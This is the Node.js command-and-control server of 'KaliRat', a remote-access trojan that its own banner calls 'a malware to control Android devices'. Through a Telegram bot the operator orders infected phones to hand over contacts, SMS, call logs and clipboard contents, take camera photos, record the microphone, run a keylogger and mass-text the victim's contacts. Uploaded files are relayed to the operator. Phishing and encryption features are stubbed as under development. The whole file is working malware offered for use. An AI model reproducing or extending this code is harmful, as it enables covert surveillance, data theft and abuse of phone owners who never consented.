const express = require("express");
const http = require("http");
const {
  Server
} = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const figlet = require('figlet');
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
  'polling': true,
  'request': {}
});

// Create the banner
figlet('KaliRat', function(err, data) {
    if (err) {
        console.log('Something went wrong...');
        console.dir(err);
        return;
    }
    console.log(data);
    console.log("      By MithunGowda.B and ManvanthGowda"); // Display the banner
});

const appData = new Map();
const actions = ["Contacts", "SMS", "Calls", "Apps", "Main camera", "Selfie Camera", "Microphone", "Clipboard", "Screenshot", "Toast", "Send SMS", "Vibrate", "Play audio", "Stop Audio", "Keylogger ON", "Keylogger OFF", "File explorer", "Gallery", "Encrypt", "Decrypt", "Send SMS to all contacts", "Pop notification", "Open URL ", "Phishing", "Back to main menu"];
app.post("/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
  const _0x1763f6 = _0xe7d0f6.file.originalname;
  const _0x3abcf4 = _0xe7d0f6.headers.model;
  bot.sendDocument(data.id, _0xe7d0f6.file.buffer, {
    'caption': "<b> File received from → " + _0x3abcf4 + '</b>',
    'parse_mode': "HTML"
  }, {
    'filename': _0x1763f6,
    'contentType': "*/*"
  });
  _0x30973d.send("Done");
});
app.get("/text", (_0x5b9a91, _0x340799) => {
  _0x340799.send(data.text);
});
io.on("connection", _0x48afef => {
  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let _0x3e1fde = _0x48afef.handshake.headers.version || "no information";
  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "no information";
  _0x48afef.model = _0x35d854;
  _0x48afef.version = _0x3e1fde;
  let _0x5ede9b = "<b> New device connected</b>\n\n" + ("<b>model</b> →" + _0x35d854 + "\n") + ("<b>version</b> → " + _0x3e1fde + "\n") + ("<b>ip</b> → <a href='https://ipinfo.io/" + _0x4c49f4 + "'>" + _0x4c49f4 + "</a>\n") + ("<b>time</b> → " + _0x48afef.handshake.time + "\n\n");
  bot.sendMessage(data.id, _0x5ede9b, {
    'parse_mode': "HTML"
  });
  _0x48afef.on("disconnect", () => {
    let _0x4c86f2 = "<b> Device disconnected</b>\n\n" + ("<b>model</b> → " + _0x35d854 + "\n") + ("<b>version</b> → " + _0x3e1fde + "\n") + ("<b>ip</b> → " + _0x4c49f4 + "\n") + ("<b>time</b> → " + _0x48afef.handshake.time + "\n\n");
    bot.sendMessage(data.id, _0x4c86f2, {
      'parse_mode': "HTML"
    });
  });
  _0x48afef.on("message", _0x44fcc5 => {
    bot.sendMessage(data.id, "<b> Message received from → " + _0x35d854 + "\n\nMessage → </b>" + _0x44fcc5, {
      'parse_mode': "HTML"
    });
  });
});
bot.on("message", _0xdbde0c => {
  if (_0xdbde0c.text === "/start") {
    bot.sendMessage(data.id, '<b> Welcome to KaliRat</b>\n\nKaliRat is a malware to control Android devices\nAny misuse of this tool Authors are Not responsible for any illegal activities\n\nDeveloped by: <a href="http://instagram.com/mithun.gowda.b">@MithunGowda.B</a>', {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["Devices", "Action"], ["About us"]],
        'resize_keyboard': true
      }
    });
  } else {
    if (appData.get("currentAction") === "microphoneDuration") {
      let _0x3376c5 = _0xdbde0c.text;
      let _0x44b92e = appData.get('currentTarget');
      if (_0x44b92e == "all") {
        io.sockets.emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      } else {
        io.to(_0x44b92e).emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      }
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
      bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["Devices", "Action"], ["About us"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get("currentAction") === "toastText") {
        let _0x3f8601 = _0xdbde0c.text;
        let _0x5c0cc9 = appData.get('currentTarget');
        if (_0x5c0cc9 == "all") {
          io.sockets.emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': _0x3f8601
            }]
          });
        } else {
          io.to(_0x5c0cc9).emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': _0x3f8601
            }]
          });
        }
        appData["delete"]("currentTarget");
        appData["delete"]("currentAction");
        bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["Devices", "Action"], ["About us"]],
            'resize_keyboard': true
          }
        });
      } else {
        if (appData.get("currentAction") === "smsNumber") {
          let _0x16b4e5 = _0xdbde0c.text;
          appData.set("currentNumber", _0x16b4e5);
          appData.set("currentAction", 'smsText');
          bot.sendMessage(data.id, "<b> Now Enter a message that you want to send to " + _0x16b4e5 + "</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [["Cancel action"]],
              'resize_keyboard': true,
              'one_time_keyboard': true
            }
          });
        } else {
          if (appData.get("currentAction") === "smsText") {
            let _0x6d597e = _0xdbde0c.text;
            let _0x1c124a = appData.get("currentNumber");
            let _0x49a537 = appData.get("currentTarget");
            if (_0x49a537 == "all") {
              io.sockets.emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': _0x1c124a
                }, {
                  'key': "text",
                  'value': _0x6d597e
                }]
              });
            } else {
              io.to(_0x49a537).emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': _0x1c124a
                }, {
                  'key': "text",
                  'value': _0x6d597e
                }]
              });
            }
            appData["delete"]('currentTarget');
            appData["delete"]("currentAction");
            appData["delete"]("currentNumber");
            bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [[" Devices ", " Action "], [" About us "]],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get("currentAction") === "vibrateDuration") {
              let _0x26f07c = _0xdbde0c.text;
              let _0x3275f8 = appData.get("currentTarget");
              if (_0x3275f8 == "all") {
                io.sockets.emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': _0x26f07c
                  }]
                });
              } else {
                io.to(_0x3275f8).emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': _0x26f07c
                  }]
                });
              }
              appData["delete"]("currentTarget");
              appData["delete"]("currentAction");
              bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [["Devices", "Action"], ["About us"]],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get("currentAction") === "textToAllContacts") {
                let _0x535777 = _0xdbde0c.text;
                let _0x3b22c4 = appData.get("currentTarget");
                if (_0x3b22c4 == "all") {
                  io.sockets.emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': _0x535777
                    }]
                  });
                } else {
                  io.to(_0x3b22c4).emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': _0x535777
                    }]
                  });
                }
                appData["delete"]("currentTarget");
                appData["delete"]("currentAction");
                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [["Devices", "Action"], ["About us"]],
                    'resize_keyboard': true
                  }
                });
              } else {
                if (appData.get("currentAction") === "notificationText") {
                  let _0x371a40 = _0xdbde0c.text;
                  appData.set("currentNotificationText", _0x371a40);
                  if (target == "all") {
                    io.sockets.emit("commend", {
                      'request': "popNotification",
                      'extras': [{
                        'key': "text",
                        'value': _0x371a40
                      }]
                    });
                  } else {
                    io.to(target).emit("commend", {
                      'request': 'popNotification',
                      'extras': [{
                        'key': "text",
                        'value': _0x371a40
                      }, {
                        'key': "url",
                        'value': url
                      }]
                    });
                  }
                  appData["delete"]('currentTarget');
                  appData["delete"]("currentAction");
                  appData["delete"]("currentNotificationText");
                  bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                    'parse_mode': "HTML",
                    'reply_markup': {
                      'keyboard': [["Devices", "Action"], ["About us"]],
                      'resize_keyboard': true
                    }
                  });
                } else {
                  if (_0xdbde0c.text === "Devices") {
                    if (io.sockets.sockets.size === 0x0) {
                      bot.sendMessage(data.id, "<b> There is no connected device</b>\n\n", {
                        'parse_mode': "HTML"
                      });
                    } else {
                      let _0x1e2656 = "<b> Connected devices count : " + io.sockets.sockets.size + "</b>\n\n";
                      let _0x518a8a = 0x1;
                      io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
                        _0x1e2656 += "<b>Device " + _0x518a8a + "</b>\n" + ("<b>model</b> → " + _0x3479dd.model + "\n") + ("<b>version</b> → " + _0x3479dd.version + "\n") + ("<b>ip</b> → " + _0x3479dd.ip + "\n") + ("<b>time</b> → " + _0x3479dd.handshake.time + "\n\n");
                        _0x518a8a += 0x1;
                      });
                      bot.sendMessage(data.id, _0x1e2656, {
                        'parse_mode': "HTML"
                      });
                    }
                  } else {
                    if (_0xdbde0c.text === "Action") {
                      if (io.sockets.sockets.size === 0x0) {
                        bot.sendMessage(data.id, "<b> There is no connected device</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
                        let _0x307c8a = [];
                        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
                          _0x307c8a.push([_0x6307e5.model]);
                        });
                        _0x307c8a.push(["All"]);
                        _0x307c8a.push(["Back to main menu"]);
                        bot.sendMessage(data.id, "<b> Select device to perform action</b>\n\n", {
                          'parse_mode': 'HTML',
                          'reply_markup': {
                            'keyboard': _0x307c8a,
                            'resize_keyboard': true,
                            'one_time_keyboard': true
                          }
                        });
                      }
                    } else {
                      if (_0xdbde0c.text === "About us") {
                        bot.sendMessage(data.id, '<b>The KaliRat is one of the unique Rat developed by MithunGowda.B and ManvanthGowda</b>\n Follow Authors on Instagram: <a href="http://instagram.com/mithun.gowda.b">@MithunGowda.B</a> and <a href="https://www.instagram.com/_.appu_kannadiga/">@ManvanthGowda</a>\n\n', {
                          'parse_mode': 'HTML'
                        });
                      } else {
                        if (_0xdbde0c.text === "Back to main menu") {
                          bot.sendMessage(data.id, "<b> Main menu</b>\n\n", {
                            'parse_mode': "HTML",
                            'reply_markup': {
                              'keyboard': [["Devices", "Action"], ["About us"]],
                              'resize_keyboard': true
                            }
                          });
                        } else {
                          if (_0xdbde0c.text === "Cancel action") {
                            let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
                            if (_0x3202e5 == "all") {
                              bot.sendMessage(data.id, "<b> Select action to perform for all available devices</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [[" Contacts ", "SMS"], ["Calls", "Apps"], ["Main camera", "Selfie Camera"], ["Microphone", "Clipboard"], ["Screenshot", "Toast"], ["Send SMS", "Vibrate"], ["Play audio", "Stop Audio"], ["Keylogger ON", "Keylogger OFF"], ["File explorer", "Gallery"], ["Encrypt", "Decrypt"], ["Open URL", "Phishing"], ["Send SMS to all contacts"], ["Pop notification"], ["Back to main menu"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            } else {
                              bot.sendMessage(data.id, "<b> Select action to perform for " + _0x3202e5 + "</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["Contacts", "SMS"], ["Calls", "Apps"], ["Main camera", "Selfie Camera"], ["Microphone", "Clipboard"], ["Screenshot", "Toast"], ["Send SMS", "Vibrate"], ["Play audio", "Stop Audio"], ["Keylogger ON", "Keylogger OFF"], ["File explorer", "Gallery"], ["Encrypt", "Decrypt"], ["Open URL", "Phishing"], ["Send SMS to all contacts"], ["Pop notification"], ["Back to main menu"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                          } else {
                            if (actions.includes(_0xdbde0c.text)) {
                              let _0x3ea82b = appData.get("currentTarget");
                              if (_0xdbde0c.text === "Contacts") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "contacts",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': 'contacts',
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "SMS") {
                                if (_0x3ea82b == "all") {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                } else {
                                  io.sockets.emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Calls") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Apps") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Main camera") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Selfie Camera") {
                                if (_0x3ea82b == 'all') {
                                  io.sockets.emit("commend", {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit('commend', {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Clipboard") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Screenshot") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Keylogger ON") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Keylogger OFF") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit('commend', {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b> The request was executed successfully, you will receive device respone soon ...\n\n Return to main menu</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "File explorer") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Gallery") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Encrypt") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Decrypt") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Microphone") {
                                appData.set("currentAction", 'microphoneDuration');
                                bot.sendMessage(data.id, "<b> Enter the microphone recording duration in seconds</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Toast") {
                                appData.set("currentAction", "toastText");
                                bot.sendMessage(data.id, "<b> Enter a message that you want to appear in toast box</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Send SMS") {
                                appData.set("currentAction", "smsNumber");
                                bot.sendMessage(data.id, "<b> Enter a phone number that you want to send SMS</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Vibrate") {
                                appData.set("currentAction", "vibrateDuration");
                                bot.sendMessage(data.id, "<b> Enter the duration you want the device to vibrate in seconds</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Send SMS to all contacts") {
                                appData.set("currentAction", "textToAllContacts");
                                bot.sendMessage(data.id, "<b> Enter text that you want to send to all target contacts</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Pop notification") {
                                appData.set("currentAction", "notificationText");
                                bot.sendMessage(data.id, "<b> Enter text that you want to appear as notification</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Cancel action"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Open URL") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Phishing") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "Play audio") {
                                bot.sendMessage(data.id, "<b> This Option is Under Development Update to you Soon</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Devices", "Action"], ["About us"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                            } else {
                              io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
                                if (_0xdbde0c.text === _0x22a16b.model) {
                                  appData.set("currentTarget", _0x30e015);
                                  bot.sendMessage(data.id, "<b> Select action to perform for " + _0x22a16b.model + "</b>\n\n", {
                                    'parse_mode': "HTML",
                                    'reply_markup': {
                                      'keyboard': [["Contacts", "SMS"], ["Calls", "Apps"], ["Main camera", "Selfie Camera"], ["Microphone", "Clipboard"], ["Screenshot", "Toast"], ["Send SMS", "Vibrate"], ["Play audio", "Stop Audio"], ["Keylogger ON", "Keylogger OFF"], ["File explorer", "Gallery"], ["Encrypt", "Decrypt"], ["Open URL", "Phishing"], ["Send SMS to all contacts"], ["Pop notification"], ["Back to main menu"]],
                                      'resize_keyboard': true,
                                      'one_time_keyboard': true
                                    }
                                  });
                                }
                              });
                              if (_0xdbde0c.text == "All") {
                                appData.set("currentTarget", "all");
                                bot.sendMessage(data.id, "<b> Select action to perform for all available devices</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["Contacts", "SMS"], ["Calls", "Apps"], ["Main camera", "Selfie Camera"], ["Microphone", "Clipboard"], ["Screenshot", "Toast"], ["Send SMS", "Vibrate"], ["Play audio", "Stop Audio"], ["Keylogger ON", "Keylogger OFF"], ["File explorer", "Gallery"], ["Encrypt", "Decrypt"], ["Open URL", "Phishing"], ["Send SMS to all contacts"], ["Pop notification"], ["Back to main menu"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 0x1388);
setInterval(() => {
  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
}, 0x75300);
server.listen(process.env.PORT || 0xbb8, () => {
  console.log("listening on port 3000");
});
